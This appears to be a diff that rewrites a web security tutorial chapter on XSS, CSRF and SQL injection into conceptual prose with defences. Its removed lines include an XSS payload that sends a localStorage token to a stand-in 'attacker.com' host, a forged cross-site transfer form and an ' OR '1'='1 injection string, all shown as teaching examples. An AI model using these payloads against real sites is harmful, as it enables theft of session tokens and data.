@@ -1,282 +1,67 @@
-# XSS, CSRF, And SQL Injection
+# Browser Attacks, Request Forgery, And Injection Surfaces
 
 ## Core Idea
 
-XSS, CSRF, and SQL injection are classic web security vulnerabilities.
+Some of the most important web security failures occur at input and rendering boundaries: untrusted data becomes executable script, the browser sends authenticated requests the user did not intend, or application input alters backend command meaning. XSS, CSRF, and injection are classic examples because they expose how thin the line can be between data and behavior.
 
-Chinese notes:
+This chapter groups them together because they all depend on boundary confusion.
 
-- `XSS`: Cross-Site Scripting, 跨站脚本攻击.
-- `CSRF`: Cross-Site Request Forgery, 跨站请求伪造.
-- `SQL Injection`: SQL 注入.
+## Cross-Site Scripting
 
-## XSS
+Cross-site scripting occurs when attacker-controlled content is interpreted as executable script in the victim's browser.
 
-XSS happens when attacker-controlled JavaScript runs in a victim's browser.
+Modern frontend frameworks reduce some XSS risk by escaping ordinary text output by default, but they do not eliminate the problem. Rich HTML rendering, unsafe third-party content, URL handling, and compromised dependencies can still reintroduce executable content.
 
-Example risk:
+This is why "we use React" is not a sufficient XSS strategy. Framework escaping helps, but dangerous rendering paths still need explicit control and sanitization.
 
-```tsx
-<div dangerouslySetInnerHTML={{ __html: userInput }} />
-```
+## XSS And Token Theft
 
-If `userInput` contains:
+XSS matters especially in token-based applications because malicious script can often read browser-accessible storage, manipulate the DOM, exfiltrate data, and act as the user within the origin.
 
-```html
-<img src=x onerror="fetch('https://attacker.com?token=' + localStorage.token)">
-```
+That is one reason token-storage decisions and XSS defense are tightly connected. A storage choice that is acceptable under strong output safety may become much riskier when rich HTML or third-party script exposure increases.
 
-the attacker may steal data.
+## Content Security Policy
 
-## XSS Prevention
+Content Security Policy is valuable as defense in depth. It does not replace output encoding or HTML sanitization, but it can meaningfully constrain which scripts may run and where content may be loaded from.
 
-- React escapes text by default.
-- Avoid `dangerouslySetInnerHTML`.
-- Sanitize HTML if rich text is required.
-- Use Content Security Policy.
-- Do not store long-lived tokens in JavaScript-accessible storage if avoidable.
-- Validate and encode output.
+This is characteristic of mature security controls: the main defense should be correct rendering and sanitization, while CSP reduces the blast radius when something else goes wrong.
 
-Safe React rendering:
+## Cross-Site Request Forgery
 
-```tsx
-export function Comment({ text }: { text: string }) {
-  return <p>{text}</p>;
-}
-```
+CSRF occurs when the browser sends an authenticated request that the user did not intentionally make, typically because cookies are sent automatically with cross-site requests.
 
-React escapes the text instead of treating it as HTML.
+This is why CSRF risk depends strongly on the authentication model. Cookie-based sessions or refresh flows require deliberate CSRF thinking. Token-in-header APIs are less exposed to classic CSRF, but they often carry stronger XSS concerns instead.
 
-Risky rich text rendering:
+The point is not that one model has no risks. It is that different session strategies shift where the primary browser-side danger lies.
 
-```tsx
-export function Article({ html }: { html: string }) {
-  return <div dangerouslySetInnerHTML={{ __html: html }} />;
-}
-```
+## CSRF Defenses
 
-Safer rich text rendering with sanitization:
+Common defenses include:
 
-```tsx
-import DOMPurify from "dompurify";
+- same-site cookie settings;
+- antiforgery tokens;
+- origin or referer checking;
+- avoiding unsafe state-changing `GET` requests;
+- using custom headers in controlled API clients.
 
-export function Article({ html }: { html: string }) {
-  const cleanHtml = DOMPurify.sanitize(html);
-  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
-}
-```
+These controls are strongest when they are treated as part of the session design rather than bolted on at the end.
 
-Content Security Policy example:
+## SQL Injection And Interpreter Boundaries
 
-```http
-Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
-```
+SQL injection happens when untrusted input changes the meaning of a database query rather than remaining a data value inside it.
 
-CSP is defense-in-depth. It does not replace output encoding and sanitization.
+The defense is conceptually simple: data should remain data. Parameterization, query abstraction, input structure validation, and least-privilege database accounts all support that rule.
 
-## CSRF
+This is also why dynamic identifiers such as column names require separate care. SQL parameters protect values, not arbitrary structural fragments of a query.
 
-CSRF tricks a user's browser into sending authenticated requests to another site.
+## Whitelists And Structured Variation
 
-It matters most when authentication uses cookies.
+Some variability is legitimate, such as letting the client choose a sort field. The safe way to support that is through explicit whitelisting and mapping rather than direct string concatenation.
 
-Example:
+This principle applies broadly beyond SQL. If user input must influence structure, the structure should come from a constrained set of known options rather than from free-form text.
 
-```html
-<form action="https://bank.example.com/transfer" method="post">
-  <input name="amount" value="1000" />
-</form>
-```
+## Design Consequences
 
-Browser may automatically include cookies.
+XSS, CSRF, and SQL injection all teach the same lesson: a secure web system must preserve the boundary between untrusted data and executable behavior. Safe rendering, session-aware request protection, parameterized queries, and explicit structural whitelists are all expressions of that same discipline.
 
-## CSRF Prevention
-
-- SameSite cookies;
-- anti-forgery tokens;
-- check Origin/Referer;
-- do not use GET for state-changing actions;
-- require custom headers for APIs;
-- use CSRF protection when using cookie auth.
-
-ASP.NET Core antiforgery setup:
-
-```csharp
-builder.Services.AddAntiforgery(options =>
-{
-    options.HeaderName = "X-CSRF-TOKEN";
-});
-```
-
-Token endpoint:
-
-```csharp
-app.MapGet("/api/auth/csrf", (HttpContext context, IAntiforgery antiforgery) =>
-{
-    var tokens = antiforgery.GetAndStoreTokens(context);
-    return Results.Ok(new { csrfToken = tokens.RequestToken });
-});
-```
-
-State-changing endpoint:
-
-```csharp
-app.MapPost("/api/orders", async (
-    HttpContext context,
-    IAntiforgery antiforgery,
-    CreateOrderRequest request,
-    IOrderService orders,
-    CancellationToken ct) =>
-{
-    await antiforgery.ValidateRequestAsync(context);
-
-    var order = await orders.CreateAsync(request, ct);
-    return Results.Created($"/api/orders/{order.Id}", order);
-});
-```
-
-Also avoid state-changing GET endpoints:
-
-```http
-GET /api/orders/123/cancel
-```
-
-Use:
-
-```http
-POST /api/orders/123/cancel
-```
-
-## SQL Injection
-
-Bad:
-
-```csharp
-var sql = $"SELECT * FROM Users WHERE Email = '{email}'";
-```
-
-If email is:
-
-```text
-' OR '1'='1
-```
-
-query behavior changes.
-
-## SQL Injection Prevention
-
-Use parameterized queries.
-
-EF Core LINQ:
-
-```csharp
-var user = await _dbContext.Users
-    .FirstOrDefaultAsync(u => u.Email == email, ct);
-```
-
-Raw SQL with parameters:
-
-```csharp
-var users = await _dbContext.Users
-    .FromSql($"SELECT * FROM Users WHERE Email = {email}")
-    .ToListAsync(ct);
-```
-
-Dynamic sort whitelist:
-
-```csharp
-var orderBy = request.SortBy switch
-{
-    "email" => "Email",
-    "createdAt" => "CreatedAt",
-    _ => throw new ValidationException("Unsupported sort field.")
-};
-
-var users = await _dbContext.Users
-    .FromSqlRaw($"SELECT * FROM Users ORDER BY {orderBy}")
-    .AsNoTracking()
-    .ToListAsync(ct);
-```
-
-The identifier is safe only because it comes from a whitelist. SQL parameters protect values, not table or column names.
-
-Least-privilege database account:
-
-```text
-App login:
-  can SELECT/INSERT/UPDATE needed tables
-  cannot DROP TABLE
-  cannot ALTER DATABASE
-  cannot access unrelated schemas
-```
-
-Least privilege limits damage if injection or credential leakage happens.
-
-## Combined Example: Safe Search Endpoint
-
-```csharp
-[HttpGet("users")]
-public async Task<ActionResult<IReadOnlyList<UserListItemDto>>> SearchUsers(
-    [FromQuery] string? email,
-    [FromQuery] string sort = "-createdAt",
-    CancellationToken ct = default)
-{
-    IQueryable<User> query = _dbContext.Users.AsNoTracking();
-
-    if (!string.IsNullOrWhiteSpace(email))
-    {
-        query = query.Where(u => u.Email.Contains(email));
-    }
-
-    query = sort switch
-    {
-        "email" => query.OrderBy(u => u.Email),
-        "-email" => query.OrderByDescending(u => u.Email),
-        "createdAt" => query.OrderBy(u => u.CreatedAt),
-        "-createdAt" => query.OrderByDescending(u => u.CreatedAt),
-        _ => query.OrderByDescending(u => u.CreatedAt)
-    };
-
-    var users = await query
-        .Take(50)
-        .Select(u => new UserListItemDto(u.Id, u.Email, u.DisplayName))
-        .ToListAsync(ct);
-
-    return Ok(users);
-}
-```
-
-This avoids SQL string concatenation and keeps sorting on a whitelist.
-
-## Review Questions
-
-### How does React help prevent XSS?
-
-> React escapes string values rendered in JSX by default. However, XSS is still possible through `dangerouslySetInnerHTML`, unsafe third-party HTML, URL injection, or compromised dependencies.
-
-### When is CSRF a risk?
-
-> CSRF is mainly a risk when browsers automatically send credentials such as cookies. Token-in-header APIs are less exposed to classic CSRF but still need XSS protection.
-
-### How do you prevent SQL injection?
-
-> Use parameterized queries or ORM-generated parameters, avoid string concatenation, validate input, and use least-privilege database accounts.
-
-## Common Mistakes
-
-- Thinking React makes XSS impossible.
-- Using localStorage tokens and ignoring XSS.
-- Cookie auth without CSRF protection.
-- GET endpoints that modify state.
-- Concatenating raw SQL.
-- Trusting frontend validation.
-
-## Practice Task
-
-Create examples for:
-
-1. safe React text rendering;
-2. unsafe HTML rendering and sanitized fix;
-3. CSRF-protected cookie API;
-4. SQL injection vulnerable query;
-5. parameterized query fix.
+Once that discipline becomes habitual, many vulnerability classes become easier to prevent before they reach code review or penetration testing.
